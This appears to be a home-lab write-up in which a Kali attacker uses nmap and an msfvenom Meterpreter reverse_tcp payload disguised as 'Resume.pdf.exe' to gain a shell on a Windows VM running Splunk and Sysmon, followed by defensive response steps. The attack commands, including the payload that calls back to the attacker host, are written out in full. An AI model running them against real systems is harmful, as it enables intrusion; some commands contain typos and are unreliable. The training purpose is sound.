## Objective

In this lab environment, I am building on foundational virtualization skills by deploying a security-focused network simulation using VirtualBox. The setup includes a Windows virtual machine configured as the defender system, equipped with Splunk Enterprise for log aggregation and analysis, and Sysmon for detailed event logging. Opposing it is a Kali Linux virtual machine, which serves as the attacker platform to simulate real-world threats and offensive security techniques. This lab is designed to strengthen my skills in threat detection, log analysis, and incident response by observing and analyzing malicious activity in a controlled environment.

## Preparation

Before conducting the test, the `Windows 10` virtual machine was preconfigured with `Splunk Enterprise` and `Sysmon` installed, along with the `Sysmon Add-on` for Splunk to enable proper event parsing and visualization. Both the Windows and Kali Linux virtual machines were connected to an `internal network` to isolate the environment. For the purpose of the test, `Windows Defender`, `Microsoft Security` features, and the system `firewall` were temporarily disabled to allow full visibility into attack behavior and network activity.

## üë£ Steps the `Attacker` Made

### Step 1: Aggressive Network Reconnaissance

The attacker used the command `nmap -A -Pn 192.168.20.10` to perform an `aggressive scan` against the host at IP address `192.168.20.10`.

```bash
nmap -A -Pn 192.168.20.10
```
<img width="626" height="248" alt="Lab 203" src="https://github.com/user-attachments/assets/49ff2b97-51ae-4a25-a16c-247070356a3a" /></br>

Based on these results, the attacker identifies that several critical ports are open on the target system, including `135/tcp (RPC)`, `139/tcp (NetBIOS Session Service)`, `445/tcp (Microsoft-DS/SMB)`, and `3389/tcp (Remote Desktop Protocol - RDP)`. These open ports provide potential attack vectors, as they correspond to services that, if improperly secured, can be exploited for unauthorized access, information gathering, or lateral movement within the network.

---

### Step 2: Generate a Malicious Reverse TCP Payload for Remote Access

```bash
msfvenom -l payloads
```
The command `msfvenom -l payloads` lists all available payload options that can be generated using the Metasploit Framework‚Äôs msfvenom tool.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.20.20 lport=4444 -f exe -o Resume.pdf.exe
```
The attacker uses `msfvenom` to generate a 64-bit Windows executable payload (`Resume.pdf.exe`) that, when run on the target system, initiates a reverse TCP connection back to the attacker‚Äôs machine at `IP 192.168.20.20` on `port 4444`, allowing remote control via a `Meterpreter` session.

```bash
ls
```

```bash
file Resume.pdf.exe
```

The commands `ls` and `file Resume.pdf.exe` are used to verify the presence of the generated payload file and confirm its file type as a Windows executable.

<img width="603" height="317" alt="Lab 204" src="https://github.com/user-attachments/assets/28eaebe8-ff59-4c9a-80ca-9fd9815a45cf" />

---

### Step 3: Setting Up a Metasploit Listener for a Reverse TCP Shell

```bash
msfconsole
```

```bash
set payload windows/x64/meterpreter/reverse_tcp payload
```

```bash
set lhost 192.168.20.20
```

```bash
options
```

The attacker is launching the Metasploit console `msfconsole`, configuring it to use the `windows/x64/meterpreter/reverse_tcp payload`, and setting the local host `lhost` IP address to `192.168.20.20`, which prepares the listener to receive a reverse connection from the target system.

---

### Step 4: Hosting a Malicious Payload Using a Python HTTP Server

```bash
ls
```

```bash
python3 -m http.server 9999
```

The attacker lists the current directory with `ls`, then uses `python3 -m http.server 9999` to start a simple HTTP server on `port 9999`, allowing files in that directory (such as a malicious payload) to be served and downloaded by a target machine.

<img width="493" height="256" alt="Lab 79" src="https://github.com/user-attachments/assets/98f1f922-ef4b-49ef-8f23-fec7373ebfec" /></br>

<img width="316" height="209" alt="Lab 206" src="https://github.com/user-attachments/assets/aec51636-2e18-4075-b114-70bf6a838ecf" /></br>

<img width="783" height="168" alt="Lab 207" src="https://github.com/user-attachments/assets/d0256e34-a026-4331-936f-3f5358de998c" /></br>

*Note: Having `file extensions` enabled is important because it allows users to see the true format of a file, helping them identify potentially malicious files disguised with misleading names (e.g., `resume.pdf` that is actually `resume.pdf.exe`). Without extensions visible, users may unknowingly open executable files thinking they are safe documents, increasing the risk of malware execution.*

---

### Step 5: Active Network Connection

```bash
network -anob
```

The command `netstat -anob` is used on Windows to display all active network connections and listening ports `-a`, show addresses and port numbers in numerical form `-n`, include the executable (binary) responsible for each connection `-b`, and display the owning process ID `-o`.

<img width="602" height="69" alt="Lab 209" src="https://github.com/user-attachments/assets/90cdb1bb-f267-471a-a16b-2f896dc91bee" />

With the execution of the `Resume.pdf.exe` payload on the victim‚Äôs machine, the attacker can now observe that a reverse TCP connection has been successfully established. Using tools like `netstat`, the attacker confirms that their machine `192.168.20.20` is actively connected to the victim‚Äôs system `192.168.20.10` over a designated port, indicating that the Meterpreter session is live and the payload has executed as intended, granting remote access to the target.

<img width="662" height="188" alt="Lab 212" src="https://github.com/user-attachments/assets/3952f535-6f1a-4287-ad98-2b07cc678794" />

---

### Step 6: Establishing a Reverse Shell and Enumerating the Victim System

```bash
exploit
```

```bash
shell
```

```bash
netuser
```

```bash
net localgroup
```

```bash
ipconfig
```

The attacker runs the `exploit` command in Metasploit‚Äôs multi/handler module to begin listening for the reverse connection from the victim. Once the connection is established, they gain a `shell` on the victim‚Äôs machine, allowing them to run commands like `net user` (to enumerate local user accounts) and `ipconfig` (to view the victim‚Äôs network configuration), effectively confirming access and gathering initial system information.

## üë£ Steps the `Defender` Made

### Step 1: Isolate the Compromised System

Disconnect the affected machine from the network to prevent further communication with the attacker or lateral movement.

### Step 2: Run Antivirus and Anti-Malware Scans

Use updated security software to detect and remove known malware.

### Step 3: Analyze Suspicious Running Processes and Network Connections

Use tools like Task Manager, netstat, or Sysinternals Process Explorer to identify suspicious activity.

### Step 4: Check for Unauthorized Users or Services

Review user accounts and running services for anomalies.

### Step 5: Inspect Event Logs

Analyze Windows Event Logs and Sysmon logs for unusual or suspicious events related to the payload execution.

### Step 6: Update and Patch 

Ensure the system‚Äôs OS and applications are fully patched to close vulnerabilities.

### Step 7: Restore from Backup

If the infection is severe, restore the system to a clean backup state.

### Step 8: Implement Endpoint Detection and Response (EDR)

Use advanced tools that monitor behavior and can automate threat containment.

### Step 9: Educate Users

Promote awareness on phishing, social engineering, and the importance of keeping file name extensions enabled to avoid being tricked by disguised malicious files.

### Step 10: Document and Report Incident

Follow organizational incident response procedures to document and escalate the issue appropriately.

### Windows Defender and Updates

Turning on `Windows Security` features‚Äîsuch as real-time antivirus protection, ransomware protection, and exploit mitigation‚Äîadds additional layers of defense. Ensuring that `Windows Updates` are enabled and set to install automatically helps keep the system protected against newly discovered threats and vulnerabilities. Additionally, keeping all operating system components and third-party applications updated with the latest security patches is essential.
